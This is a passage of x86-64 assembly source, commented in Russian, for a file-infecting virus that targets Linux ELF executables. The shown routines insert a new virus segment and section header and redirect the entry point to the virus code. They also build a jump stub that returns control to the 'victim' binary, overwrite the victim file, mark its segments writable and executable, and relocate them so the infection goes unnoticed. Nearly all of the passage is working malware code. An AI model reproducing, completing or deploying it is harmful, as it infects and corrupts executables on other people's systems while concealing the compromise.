    add     $0x8, %rax

    mov     virus_new_vaddr(%rip), %rbx
    mov     %rbx, (%rax)  # sh_addr
    add     $0x8, %rax

    mov     victim_elf_addr(%rip), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    mov     %rbx, (%rax)  # sh_offset
    add     $0x8, %rax

    mov     virus_code_size(%rip), %rbx

    mov     data_size(%rip), %rcx

    mov     %rbx, (%rax) # sh_size
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поля sh_link, sh_info, sh_addralign, sh_entsize
    # при инициализации записаны нулями,
    # а нам и нужно чтоб они были
    # заполнены нулями
_generate_virus_shdr_success:
    xor     %rax, %rax
    jmp     _generate_virus_shdr_exit

_generate_virus_shdr_fail:
    mov     $-1, %rax

_generate_virus_shdr_exit:
    pop     %rbx
    ret

/// GENERATE_BIND_NOW_FLAG_RECORD
/// Создает запись для флага BIND_NOW
_generate_bind_now_flag_record:
    mov     new_bind_now_flag_record_size(%rip), %rax
    test    %rax, %rax
    je      _generate_bind_now_flag_record_fail

    leaq    bind_now_flag_record(%rip), %rax
    movb    $0x18, (%rax)

_generate_bind_now_flag_record_success:
    xor     %rax, %rax
    jmp     _generate_bind_now_flag_record_exit

_generate_bind_now_flag_record_fail:
    mov     $-1, %rax

_generate_bind_now_flag_record_exit:
    ret


/// _EDIT_ELF_HDR
/// Редактирует заголовок эльфа
/// и сохраняет его оргинальный e_entry
_edit_elf_hdr:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    mov     virus_code_size(%rip), %rsi
    test    %rsi, %rsi
    je      _edit_elf_hdr_fail

    mov     victim_elf_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _edit_elf_hdr_fail

    mov     virus_new_vaddr(%rip), %rdx
    test    %rdx, %rdx
    je      _edit_elf_hdr_fail

     mov     ELF_E_ENTRY(%rdi), %rcx
     mov     %rcx, original_e_entry(%rip) # save original e_entry
     
     mov     virus_new_vaddr(%rip), %rdx
     mov     %rdx, ELF_E_ENTRY(%rdi)

    mov     stripped_mode(%rip), %rax
    cmp     $0x1, %rax
    je      _edit_elf_hdr_stripped

    
    mov     data_size(%rip), %rcx
    add     %rcx, %rsi  # + размер блока данных
    
    mov     new_bind_now_flag_record_size(%rip), %rdx
    add     %rdx, %rsi  # + размер вставляемой записи dynamic
    add     $0x38, %rsi # + размер вставляемого заголовка
    add     %rsi, ELF_E_SHOFF(%rdi)
    add     $0x1, ELF_E_SHNUM(%rdi)

_edit_elf_hdr_stripped:
    add     $0x1, ELF_E_PHNUM(%rdi)

_edit_elf_hdr_success:
    xor     %rax, %rax
    jmp     _edit_elf_hdr_exit

_edit_elf_hdr_fail:
    mov     $-1, %rax

_edit_elf_hdr_exit:
    pop    %rsi
    pop    %rdi
    pop    %rdx
    pop    %rcx
    ret

/// _COUNT_OFFSET_TO_ORIG_E_ENTRY
/// считает смещение до оригинльного e_entry,
/// чтоб его мог использовать jmp, который передаст
/// управление жертве после того,
/// как вирус в ней отработает
_count_offset_to_orig_e_entry:
    push   %rbx
    push   %rcx

    // проверяем данные
    // проверяем данные
    mov     virus_code_size(%rip), %rax
    test    %rax, %rax
    je      _count_offset_to_orig_e_entry_fail
    
    mov     original_e_entry(%rip), %rbx
    test    %rbx, %rbx
    je      _count_offset_to_orig_e_entry_fail
    
    mov     virus_new_vaddr(%rip), %rcx
    test    %rcx, %rcx
    je      _count_offset_to_orig_e_entry_fail
    
    // считаем адрес, на котором будем находиться,
    // когда будем передавать управление жертве
    dec     %rax
    add     %rcx, %rax
    
    mov     %rax, %rdi

    
    // посчитали смещение,
    // должно быть отрицательным, поскольку
    // оригинальный e_entry всегда будет выше
    // _global_exit
    mov     original_e_entry(%rip), %rbx

    sub    %rax, %rbx
    movl   %ebx, offset_to_e_entry(%rip)

_count_offset_to_orig_e_entry_success:
    xor     %rax, %rax
    jmp     _count_offset_to_orig_e_entry_exit

_count_offset_to_orig_e_entry_fail:
    mov     $-1, %rax

_count_offset_to_orig_e_entry_exit:
    pop    %rcx
    pop    %rbx
    ret

/// _COUNT_OFFSET_TO_MOVE_VICTIM
/// считает смещение до функции move_victim
/// всегда возвращает true
_count_offset_to_move_victim:
    push   %rbx

    leaq    _move_victim(%rip), %rbx
    leaq    _global_exit(%rip), %rax
    add     $0x5, %rax  # пропустили будущую команду jmp

    sub     %rax, %rbx
    movl    %ebx, move_victim_offset(%rip)

    xor     %rax, %rax
    pop     %rbx
    ret
/// _COUNT_OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN
/// считаем смещение от начала файла до оригинального
/// e_entry
_count_offset_to_e_entry_frm_file_begin:
    push    %rsi
    push    %rdx

    mov     first_seg_vaddr(%rip), %rsi

    mov     original_e_entry(%rip), %rdx
    test    %rdx, %rdx
    je      _count_offset_to_e_entry_frm_file_begin_fail

    sub     %rsi, %rdx
    mov     %rdx, offset_to_e_entry_frm_file_begin(%rip)

_count_offset_to_e_entry_frm_file_begin_success:
    xor     %rax, %rax
    jmp     _count_offset_to_e_entry_frm_file_begin_exit

_count_offset_to_e_entry_frm_file_begin_fail:
    mov      $-1, %rax

_count_offset_to_e_entry_frm_file_begin_exit:
    pop     %rdx
    pop     %rsi

    ret

///_COUNT_FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY_OFFSET
/// считает смещение от нового e_entry
/// до оригинального
_count_frm_orig_e_entry_to_virus_e_entry_offset:
    push    %rcx
    push    %rdx

    mov     virus_new_vaddr(%rip), %rcx
    test    %rcx, %rcx
    je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

    mov     original_e_entry(%rip), %rdx
    test    %rdx, %rdx
    je     _count_frm_orig_e_entry_to_virus_e_entry_offset_fail

    sub     %rdx, %rcx
    mov     %rcx, frm_orig_e_entry_to_virus_e_entry_offset(%rip)

_count_frm_orig_e_entry_to_virus_e_entry_offset_success:
    xor     %rax, %rax
    jmp     _count_frm_orig_e_entry_to_virus_e_entry_offset_exit

_count_frm_orig_e_entry_to_virus_e_entry_offset_fail:
    mov      $-1, %rax

_count_frm_orig_e_entry_to_virus_e_entry_offset_exit:
    pop     %rdx
    pop     %rcx

    ret

/// _TRANSFER_CONTROL_TO_VICTIM
/// создает блок кода для передачи
/// управления на жертву - записывает опкоды
/// операций и необходимые смещения
transfer_control_code_size:
    .quad  0xB

transfer_control_code:
    .space  0xB, 0

_transfer_control_to_victim:
    push    %rbx

    lea     transfer_control_code(%rip), %rax

    mov     $0xe8, %rbx
    movzwl  %bx, %ebx
    
    // call opcode
    movb    %bl, (%rax)
    inc     %rax
    
    // offset
    mov     move_victim_offset(%rip), %rbx
    test    %rbx, %rbx
    je      _transfer_control_to_victim_fail
    
    mov     %ebx, (%rax)
    add     $0x4, %rax
    

    mov     $0xe9, %rbx
    movzwl  %bx, %ebx

    // jmp opcode
    movb    %bl, (%rax)
    inc     %rax

    mov     offset_to_e_entry(%rip), %rbx
    test    %rbx, %rbx
    je      _transfer_control_to_victim_fail

    mov     %ebx, (%rax)
    add     $0x4, %rax

    // nop opcode
    mov     $0x90, %rbx
    movzwl  %bx, %ebx
    movb    %bl, (%rax)

_transfer_control_to_victim_success:
    xor     %rax, %rax
    jmp     _transfer_control_to_victim_exit

_transfer_control_to_victim_fail:
    mov     $-1, %rax

_transfer_control_to_victim_exit:
    pop     %rbx
    ret

/// _MAKE_VICTIM_DATA_BLOCK_WITH_DYNAMIC_DATA
_make_victim_data_block:
    push    %rbx
    push    %rcx

    // начинаем записывать данные, проверяя
    // наличие критически важных
    leaq    data_block(%rip), %rax

    mov     first_seg_vaddr(%rip), %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     offset_to_e_entry_frm_file_begin(%rip), %rbx
    test    %rbx, %rbx
    je     _make_victim_data_block_fail

    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
    test    %rbx, %rbx
    je     _make_victim_data_block_fail

    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     victim_code_offset(%rip), %rbx
    test     %rbx, %rbx
    je     _make_victim_data_block_fail

    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     dynamic_records_vaddr(%rip), %rbx
    add     $0x38, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     dynamic_records_size(%rip), %rbx
    mov     new_bind_now_flag_record_size(%rip), %rcx
    add     %rcx, %rbx
    movq    %rbx, (%rax)
    add     $0x8, %rax

    mov     dynamic_records_offset(%rip), %rbx
    add     $0x38, %rbx
    movq    %rbx, (%rax)

    xor     %rax, %rax
    jmp     _make_victim_data_block_exit

_make_victim_data_block_fail:
    mov     $-1, %rax

_make_victim_data_block_exit:
    pop     %rcx
    pop     %rbx
    ret


/// _RECOUNT_VICTIM
/// Пересчитывает данные жертвы
_recount_victim:

    call    _recount_symbols_addrs
    // test    %rax, %rax
    // jne     _recount_victim_fail

    call   _recount_jmprela_table
    call   _recount_rela_table

_recount_hdrs:
    call    _phdr_offset_and_addr_recount
    test    %rax, %rax
    jne     _recount_victim_fail

    mov      stripped_mode(%rip), %rax
    test     %rax, %rax
    jne      _recount_dynamic_and_got

    call    _shdr_offset_and_addr_recount
    test    %rax, %rax
    jne     _recount_victim_fail

_recount_dynamic_and_got:

    call    _recount_dynamic_section
    test    %rax, %rax
    jne     _generate_virus_data

_generate_virus_data:
    call    _count_virus_new_vaddr
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _generate_bind_now_flag_record

    call    _generate_virus_phdr
    test    %rax, %rax
    jne     _recount_victim_fail

    mov      stripped_mode(%rip), %rax
    test     %rax, %rax
    jne      _recount_elf_hdr

    call    _generate_virus_shdr
    test    %rax, %rax
    jne     _recount_victim_fail

_recount_elf_hdr:
    call    _edit_elf_hdr
    test    %rax, %rax
    jne     _recount_victim_fail

_count_offsets:
    call    _count_offset_to_orig_e_entry
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _count_offset_to_move_victim
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _count_offset_to_e_entry_frm_file_begin
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _count_frm_orig_e_entry_to_virus_e_entry_offset
    test    %rax, %rax
    jne     _recount_victim_fail

_make_opcode_blocks:
    call    _transfer_control_to_victim
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _make_victim_data_block
    test    %rax, %rax
    jne     _recount_victim_fail

_recount_victim_success:
    movq    $0, recount_success(%rip)
    xor     %rax, %rax
    jmp     _recount_victim_exit

_recount_victim_fail:
    mov      $-1, %rax

_recount_victim_exit:
    ret


/// _GET_VIRUS_CODE
///
/// Читает указатель начала кода вируса и размер этого
/// кода.
/// Записывает адрес кода вируса в virus_code_addr и
/// размер этого кода в virus_code_size
_get_virus_code:
    push    %rdi
    push    %rsi

    leaq    _start(%rip), %rdi  # начало вируса
    mov     %rdi, virus_code_addr(%rip)

    leaq    _global_exit(%rip), %rsi
    sub     %rdi, %rsi  # virus size

    # exit + размер блока передачи управления
    mov     transfer_control_code_size(%rip), %rax
    add     %rax, %rsi

    leaq    virus_code_size(%rip), %rdi
    mov     %rsi, (%rdi)

_get_virus_code_success:
    xor     %rax, %rax
    movq    $0, get_virus_success(%rip)

    pop     %rsi
    pop     %rdi
    ret

/// _OPEN_INTERM_FILE
/// открывает промежуточный файл
_open_interm_file:
    push    %rdi
    push    %rsi
    push    %rdx

    lea     new_elf_file(%rip), %rdi
    // RDWR + O_CREAT
    mov     $0x42, %rsi
    // разрешение на rwx
    mov     $0x1ff, %rdx
    mov     $OPEN_SYSCALL, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _open_interm_file_fail

_open_interm_file_success:
    mov     %rax, interm_fd_file(%rip)
    xor     %rax, %rax
    jmp     _open_interm_file_exit

_open_interm_file_fail:
    mov     $-1, %rax

_open_interm_file_exit:
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _REWRITE_TO_VICTIM_FILE
/// Переписывает весь код из промежуточного файла
/// в файл жертвы
_rewrite_to_victim_file:
    push    %rdi
    push    %rsi
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    test    %rdi, %rdi
    je      _rewrite_to_victim_file_fail

    mov     $CLOSE_SYSCALL, %rax      # syscall close
    syscall

    // соxранили fd жертвы
    mov     fd(%rip), %rbx

    lea     new_elf_file(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile
    cmp     $0x0, %rax
    jl     _rewrite_to_victim_file_fail

    mov     %rbx, %rdi
    mov     %rax, %rsi
    xor     %rcx, %rcx
    xor     %r10, %r10
    mov     file_sz(%rip), %rdx

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _rewrite_to_victim_file_fail

_rewrite_to_victim_file_success:
    xor     %rax, %rax
    jmp     _rewrite_to_victim_file_exit

_rewrite_to_victim_file_fail:
    mov     $-1, %rax

_rewrite_to_victim_file_exit:
    pop     %r10
    pop     %rdx
    pop     %rcx
    pop     %rbx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_TILL_PHDR_TABLE_END
/// Вписывает в файл жертву от ее начала до
/// конца таблицы заголовков сегментов
_write_till_phdr_table_end:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    mov     victim_elf_addr(%rip), %rsi
    mov     victim_phdr_table_size(%rip), %rdx
    add     $0x40, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_till_phdr_table_end_fail

_write_till_phdr_table_end_success:
    xor     %rax, %rax
    jmp     _write_till_phdr_table_end_exit

_write_till_phdr_table_end_fail:
    mov     $-1, %rax

_write_till_phdr_table_end_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_NEW_PHDR_VIRUS
/// Вписывает новый заголовок в жертву
_write_new_phdr_virus:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    virus_new_phdr(%rip), %rsi
    mov     $0x38, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_new_phdr_virus_fail

_write_new_phdr_virus_success:
    xor     %rax, %rax
    jmp     _write_new_phdr_virus_exit

_write_new_phdr_virus_fail:
    mov     $-1, %rax

_write_new_phdr_virus_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_WHOLE_VICTIM
/// Записывает код жертвы
/// одним вызовом в файл
_write_whole_victim:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     new_bind_now_flag_record_size(%rip), %rdi
    test    %rdi, %rdi
    jne     _write_whole_victim_fail

    mov     interm_fd_file(%rip), %rdi
    mov     victim_code_addr(%rip), %rsi
    mov     victim_code_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_whole_victim_fail

_write_whole_victim_success:
    xor     %rax, %rax
    jmp     _write_whole_victim_exit

_write_whole_victim_fail:
    mov     $-1, %rax

_write_whole_victim_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_VICTIM_CODE_WITH_BIMD_NOW
/// Вписывает жертву с записью BIND_NOW
_write_victim_code_with_bind_now:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     new_bind_now_flag_record_size(%rip), %rdi
    test    %rdi, %rdi
    je      _write_victim_code_with_bind_now_fail

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8
    
    mov     victim_code_before_bind_now_addr(%rip), %rsi
    mov     victim_code_before_bind_now_size(%rip), %rdx
    
    add     %rdx, %r8
    mov     interm_fd_file(%rip), %rdi
    mov     $0x12, %rax
    syscall
    
    test   %rax, %rax
    je     _write_victim_code_with_bind_now_fail
    

    // вписываем запись BIND_NOW

    // вписываем запись BIND_NOW
    mov     %r8, %rcx
    mov     %rcx, %r10
    
    leaq    bind_now_flag_record(%rip), %rsi
    mov     new_bind_now_flag_record_size(%rip), %rdx
    
    add     %rdx, %r8
    
    mov     interm_fd_file(%rip), %rdi
    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall
    
    test   %rax, %rax
    je     _write_victim_code_with_bind_now_fail
    

    // вписываем жертву от точки, куда вставили
    // запись BIND_NOW, до конца
    mov     %r8, %rcx
    mov     %rcx, %r10
    
    mov     victim_code_after_bind_now_addr(%rip), %rsi
    mov     victim_code_after_bind_now_size(%rip), %rdx
    
    add     %rdx, %r8
    
    mov     interm_fd_file(%rip), %rdi
    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    mov    %r8, file_offset(%rip) # 0x401918

    test   %rax, %rax
    je     _write_victim_code_with_bind_now_fail


_write_victim_code_with_bind_now_success:
    xor    %rax, %rax
    jmp     _write_victim_code_with_bind_now_exit

_write_victim_code_with_bind_now_fail:
    mov     $-1, %rax

_write_victim_code_with_bind_now_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_WHOLE_VICTIM
/// Записывает код жертвы
/// одним вызовом в файл
_write_virus_code:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    mov     virus_code_addr(%rip), %rsi
    mov     virus_code_size(%rip), %rdx

    mov     transfer_control_code_size(%rip), %rax
    sub     %rax, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_virus_code_fail

_write_virus_code_success:
    xor     %rax, %rax
    jmp     _write_virus_code_exit

_write_virus_code_fail:
    mov     $-1, %rax

_write_virus_code_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_TRANSFER_CONTROL_CODE_BLOCK
/// Записывает код жертвы
/// одним вызовом в файл
_write_transfer_control_code_block:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    transfer_control_code(%rip), %rsi
    mov     transfer_control_code_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_transfer_control_code_block_fail

_write_transfer_control_code_block_success:
    xor     %rax, %rax
    jmp     _write_transfer_control_code_block_exit

_write_transfer_control_code_block_fail:
    mov     $-1, %rax

_write_transfer_control_code_block_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_DATA_BLOCK
/// Записывает код жертвы
/// одним вызовом в файл
_write_data_block:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    data_block(%rip), %rsi
    mov     data_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_data_block_fail

_write_data_block_success:
    xor     %rax, %rax
    jmp     _write_data_block_exit

_write_data_block_fail:
    mov     $-1, %rax

_write_data_block_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _WRITE_VICTIM_SHDRS
///  Пишет таблицу заголовков секций
_write_victim_shdrs:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    mov     victim_shdr_table_addr(%rip), %rsi
    mov     victim_shdr_table_size(%rip), %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    // test   %rax, %rax
    // je     _write_data_block_fail

_write_victim_shdrs_success:
    xor     %rax, %rax
    jmp     _write_victim_shdrs_exit

_write_victim_shdrs_fail:
    mov     $-1, %rax

_write_victim_shdrs_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret


/// _WRITE_VICTIM_SHDRS
///  Пишет таблицу заголовков секций
_write_virus_new_shdr:
    push    %rdi
    push    %rsi
    push    %rdx
    push    %rcx
    push    %r10

    mov     interm_fd_file(%rip), %rdi
    leaq    virus_new_shdr(%rip), %rsi
    mov     $0x40, %rdx

    mov     file_offset(%rip), %rcx
    mov     %rcx, %r10
    mov     %rcx, %r8

    add     %rdx, %r8
    mov     %r8, file_offset(%rip)

    mov     $PWRITE_SYSCALL, %rax   # syscall pwrite
    syscall

    test   %rax, %rax
    je     _write_virus_new_shdr_fail

_write_virus_new_shdr_success:
    xor     %rax, %rax
    jmp     _write_virus_new_shdr_exit

_write_virus_new_shdr_fail:
    mov     $-1, %rax

_write_virus_new_shdr_exit:
    pop     %r10
    pop     %rcx
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _RECOMBINE_ELF_WITHOUT_NEW_BIND_NOW
/// Перекомпоновывает эльф
_recombine_elf:
    push    %rdi
    push    %rsi
    push    %rdx

    // промежуточный файл открыт?
    mov     interm_fd_file(%rip), %rdi
    // mov     fd(%rip), %rdi
    // mov     %rdi, interm_fd_file(%rip)

    test    %rdi, %rdi
    je      _recombine_elf_fail

    // этапы парсинга жертвы, получения данных вируса
    // и пересчитывания жертвы прошли успешно?
    mov     parse_success(%rip), %rdx
    test    %rdx, %rdx
    jne      _recombine_elf_fail

    mov     recount_success(%rip), %rdx
    test    %rdx, %rdx
    jne      _recombine_elf_fail

    mov     get_virus_success(%rip), %rdx
    test    %rdx, %rdx
    jne      _recombine_elf_fail

    // тогда переколбашиваем эльф
_recombine_cur_elf:
    call    _write_till_phdr_table_end
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_new_phdr_virus
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_whole_victim
    test    %rax, %rax
    je      _write_end_of_file

    call    _write_victim_code_with_bind_now
    test    %rax, %rax
    jne     _recombine_elf_fail
    

_write_end_of_file:
    call    _write_virus_code
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_transfer_control_code_block
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_data_block
    test    %rax, %rax
    jne     _recombine_elf_fail
    

    mov     stripped_mode(%rip), %rax
    test    %rax, %rax
    jne     recombine_elf_success

    call    _write_victim_shdrs
    test    %rax, %rax
    jne     _recombine_elf_fail

    call    _write_virus_new_shdr
    test    %rax, %rax
    jne     _recombine_elf_fail

recombine_elf_success:
    xor     %rax, %rax
    jmp     _recombine_elf_exit

_recombine_elf_fail:
    mov     $-1, %rax

_recombine_elf_exit:
    pop     %rdx
    pop     %rsi
    pop     %rdi
    ret

/// _GET_SEGM_ADDR_AND_SZ
/// считает адрес, по которому начинается
/// сегмент в памяти, адрес, по которму заканчивается
/// и размер сегмента
_get_segm_addr_and_sz:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8

    // проверяем необходимые данные
    mov     cur_seg_hdr_ptr(%rip), %rax
    test    %rax, %rax
    je      _get_segm_addr_and_sz_fail

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _get_segm_addr_and_sz_fail

    // считаем
    mov     first_seg_vaddr(%rip), %rcx

    mov     PHDR_P_VADDR(%rax), %rbx
    sub     %rcx, %rbx

    // размер сегмента
    mov     PHDR_P_MEMSZ(%rax), %rcx
    mov     %rcx, cur_seg_memsz(%rip)

    // адрес начала сегмента
    mov     victim_elf_addr(%rip), %r8
    add     %r8, %rbx
    mov     %rbx, cur_seg_addr(%rip)

    // адрес конца сегмента
    add     %rcx, %rbx
    mov     %rbx, cur_seg_end_addr(%rip)

_get_segm_addr_and_sz_success:
    xor     %rax, %rax
    jmp     _get_segm_addr_and_sz_exit

_get_segm_addr_and_sz_fail:
    mov     $-1, %rax

_get_segm_addr_and_sz_exit:
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

    ret

// _COUNT_BEGIN_ELF_ADDR_IN_MEMORY
// Считает адрес, по которому лежит
// инфицированный исполняющийся эльф
_count_begin_elf_addr_in_memory:
    push    %rdi
    push    %rsi

    mov     frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rsi
    test    %rsi, %rsi
    je      _count_begin_elf_addr_in_memory_fail

    mov     offset_to_e_entry_frm_file_begin(%rip), %rdi
    test    %rdi, %rdi
    je      _count_begin_elf_addr_in_memory_fail

    // грузим адрес _start - это будет
    // актульаный e_entry
    leaq    _start(%rip), %rax

    sub     %rsi, %rax
    sub     %rdi, %rax

    mov     %rax, victim_elf_addr(%rip)

_count_begin_elf_addr_in_memory_success:
    xor     %rax, %rax
    jmp    _count_begin_elf_addr_in_memory_exit

_count_begin_elf_addr_in_memory_fail:
    mov     $-1, %rax

_count_begin_elf_addr_in_memory_exit:
    pop     %rsi
    pop     %rdi
    ret

/// _COUNT_DYNAMIC_ADDR
/// Считает адрес секции dynamic в памяти
_count_dynamic_addr:
    push    %rbx

    mov     dynamic_records_vaddr(%rip), %rax
    test    %rax, %rax
    je      _count_dynamic_addr_fail

    mov     first_seg_vaddr(%rip), %rbx
    sub     %rbx, %rax

    mov     victim_elf_addr(%rip), %rbx
    test    %rbx, %rbx
    je      _count_dynamic_addr_fail

    add     %rax, %rbx
    mov     %rbx, dynamic_records_addr(%rip)

_count_dynamic_addr_success:
    xor     %rax, %rax
    jmp     _count_dynamic_addr_exit

_count_dynamic_addr_fail:
    mov     $-1, %rax

_count_dynamic_addr_exit:
    pop     %rbx
    ret

/// _MOVE_VICTIM
/// Сдвигает жертву на ее прежние адреса
_move_victim:
    call    _get_move_victim_data
    test    %rax, %rax
    jne     _move_victim_fail

    call    _count_begin_elf_addr_in_memory
    test    %rax, %rax
    jne     _move_victim_fail

    call    _get_phdrs_info
    test    %rax, %rax
    jne     _move_victim_fail

    call    _mprotect_in_loop
    test    %rax, %rax
    jne     _move_victim_fail

    call   _count_dynamic_addr
    test    %rax, %rax
    jne     _move

    call    _recount_dynamic_section

_move:
    call    _move_segments
    test    %rax, %rax
    jne     _move_victim_fail

_move_victim_success:
    ret

_move_victim_fail:
    jmp     _exit_virus

/// _MPROTECT_IN_LOOP
/// Разрешает самомодификацию жертве
/// Проходится по заголовкам сегментов,
/// находит сгменты типа LOAD, читает
/// их виртуальные адреса, пересчитывает в физические
/// вызывает mprotect для каждого сегмента LOAD
_mprotect_in_loop:
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %rdi
    push    %rsi

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _mprotect_cycle_fail

    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _mprotect_cycle_fail

_mprotect_cycle:
    // загружаемвый сегмент?
    cmp     $0x1, (%rdi)
    jne     _mprotect_cycle_next

    // высчитать его адрес и в памяти
    // и вызвать для него mprotect
    mov     %rdi, cur_seg_hdr_ptr(%rip)
    call    _get_segm_addr_and_sz
    test    %rax, %rax
    jne     _mprotect_cycle_fail

    // syscall меняет rcx
    mov     %rcx, %r8
    mov     %rdi, %rbx

    mov     cur_seg_addr(%rip), %rdi
    mov     cur_seg_end_addr(%rip), %rsi
    
    and     $~0xFFF, %rdi  # выровненный адрес
    sub     %rdi, %rsi  # размер памяти
    
    mov     $0x7, %rdx   # RW+EXEC flags - $RDX
    mov     $0xA, %rax   # mprotect handle
    syscall
    
    test    %rax, %rax
    jne     _mprotect_cycle_fail
    

    mov     %r8, %rcx
    mov     %rbx, %rdi

_mprotect_cycle_next:
    add     $0x38, %rdi
    loop    _mprotect_cycle

_mprotect_cycle_success:
    xor     %rax, %rax
    jmp     _mprotect_cycle_exit

_mprotect_cycle_fail:
    mov     $-1, %rax

_mprotect_cycle_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx
    ret

/// _MOVE_SEGMENTS
/// Сдвигает жертву в памяти процесса таким
/// образом, как будто никакого заражения не
/// было
_move_segments:
    push    %rcx
    push    %rbx
    push    %rdx
    push    %rdi

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _move_segments_fail

    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _move_segments_fail

_move_segments_cycle:
    // загружаемвый сегмент?
    cmp     $0x1, (%rdi)
